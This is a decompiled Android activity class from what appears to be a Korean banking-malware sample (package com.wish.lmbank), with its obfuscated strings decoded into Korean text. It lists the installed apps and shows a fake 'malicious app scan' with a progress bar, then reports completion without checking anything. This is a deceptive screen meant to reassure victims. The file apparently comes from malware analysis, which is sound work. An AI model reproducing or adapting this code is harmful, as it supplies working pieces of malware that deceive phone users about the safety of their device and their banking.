package com.wish.lmbank.activity;

import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.RelativeLayout;
import android.widget.TextView;

import com.wish.lmbank.R;
import com.wish.lmbank.R2;
import com.wish.lmbank.base.BaseActivityV;
import com.wish.lmbank.utils.HandlerUtils;
import com.wish.lmbank.view.CircularProgressView;

import java.util.List;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/activity/ScanningAppForOBQActivity.class */
public class ScanningAppForOBQActivity extends BaseActivityV {
    private ImageView appIcon;
    private Button btExitApp;
    private CircularProgressView circularProgressView;
    private boolean isStartDetect = false;
    private boolean isStartScanning = false;
    private RelativeLayout rlScanningSuccess;
    private TextView scanTitle;
    private RelativeLayout secondPage;
    private RelativeLayout startDetect;
    private TextView textContent;

    @Override // com.wish.lmbank.base.BaseActivityV, com.wish.lmbank.base.BaseFuncIml
    public int initLayoutView() {
        return R2.layout.activity_scanning_app_for_obq;
    }

    @Override // com.wish.lmbank.base.BaseActivityV, com.wish.lmbank.base.BaseFuncIml
    public void initView() {
        super.initView();
        this.secondPage = (RelativeLayout) findViewById(R2.id.second_page);
        this.rlScanningSuccess = (RelativeLayout) findViewById(R2.id.rl_scanning_success);
        this.appIcon = (ImageView) findViewById(R2.id.app_icon);
        this.scanTitle = findViewById(R2.id.scan_title);
        this.textContent = findViewById(R2.id.text_content);
        this.btExitApp = findViewById(R2.id.bt_exit_app);
        this.startDetect = (RelativeLayout) findViewById(R2.id.start_detect);
        this.circularProgressView = (CircularProgressView) findViewById(R2.id.circular_progress_view);
        this.appIcon.setImageDrawable(getDrawable(R2.mipmap.ic_launcher_obq));
    }

    @Override // com.wish.lmbank.base.BaseActivityV, com.wish.lmbank.base.BaseFuncIml
    public void initListener() {
        super.initListener();
        this.startDetect.setOnClickListener(this);
        this.btExitApp.setOnClickListener(this);
    }

    @Override // com.wish.lmbank.base.BaseActivityV, android.view.View.OnClickListener
    public void onClick(View view) {
        super.onClick(view);
        if (view.getId() == R.id.nd) {
            boolean z = !this.isStartDetect;
            this.isStartDetect = z;
            if (!z || this.isStartScanning) {
                return;
            }
            this.isStartScanning = true;
            new Thread(new Runnable() { // from class: com.wish.lmbank.activity.ScanningAppForOBQActivity.1

                @Override // java.lang.Runnable
                public void run() {
                    startScanning();
                }
            }).start();
        } else if (view.getId() == R.id.cx) {
            this.rlScanningSuccess.setVisibility(View.GONE);
            this.secondPage.setVisibility(View.VISIBLE);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void startScanning() {
        PackageManager packageManager = getPackageManager();
        List<PackageInfo> installedPackages = packageManager.getInstalledPackages(0);
        HandlerUtils.getMainThreadHandler().post(new Runnable() { // from class: com.wish.lmbank.activity.ScanningAppForOBQActivity.2

            @Override // java.lang.Runnable
            public void run() {
                ScanningAppForOBQActivity.this.circularProgressView.setMax(installedPackages.size());
                ScanningAppForOBQActivity.this.circularProgressView.setProgress(0);
            }
        });
        for (PackageInfo packageInfo : installedPackages) {
            HandlerUtils.getMainThreadHandler().post(new Runnable() { // from class: com.wish.lmbank.activity.ScanningAppForOBQActivity.3
                @Override // java.lang.Runnable
                public void run() {
                    ScanningAppForOBQActivity.this.appIcon.setImageDrawable(packageInfo.applicationInfo.loadIcon(packageManager));
                    ScanningAppForOBQActivity.this.circularProgressView.setProgress(ScanningAppForOBQActivity.this.circularProgressView.getProgress() + 1);
                    double progress = ScanningAppForOBQActivity.this.circularProgressView.getProgress() / installedPackages.size();
                    TextView textView = ScanningAppForOBQActivity.this.scanTitle;
//                     textView.setText(((int) (progress * 100.0d)) + bb7d7pu7.m5998("TA"));
                    textView.setText(((int) (progress * 100.0d)) + "%");
//                     ScanningAppForOBQActivity.this.textContent.setText(bb7d7pu7.m5998("g9rJg9n0guLxhfTxSYPR2YPR2YX--YXt9WOD2-mF68WCzNVJhc7thP_ghc34SYX37ILi4YLizQ"));
                    ScanningAppForOBQActivity.this.textContent.setText("고객님의 기기에서 검사를 진행중 입니다");
                    if (installedPackages.indexOf(packageInfo) == installedPackages.size() - 1) {
                        ScanningAppForOBQActivity.this.rlScanningSuccess.setVisibility(View.VISIBLE);
                        ScanningAppForOBQActivity.this.secondPage.setVisibility(View.GONE);
                        ScanningAppForOBQActivity.this.isStartScanning = false;
                        ScanningAppForOBQActivity.this.appIcon.setImageDrawable(ScanningAppForOBQActivity.this.getDrawable(R2.mipmap.ic_launcher_obq));
//                         ScanningAppForOBQActivity.this.scanTitle.setText(bb7d7pu7.m5998("hfzshe3YhfzYg9vphevF"));
                        ScanningAppForOBQActivity.this.scanTitle.setText("악성앱검사");
//                         ScanningAppForOBQActivity.this.textContent.setText(bb7d7pu7.m5998("hfzshe3YhfzYg9vphevFgtvthOPVhfTthO3ZhdDxhPzxhf7FY4Pb6YXrxYLM1YXO7YT_4IT88YXt0YXz_Q"));
                        ScanningAppForOBQActivity.this.textContent.setText("악성앱검사버튼을터치하여 검사를진행하세요");
                    }
                }
            });
            try {
                Thread.sleep(100L);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
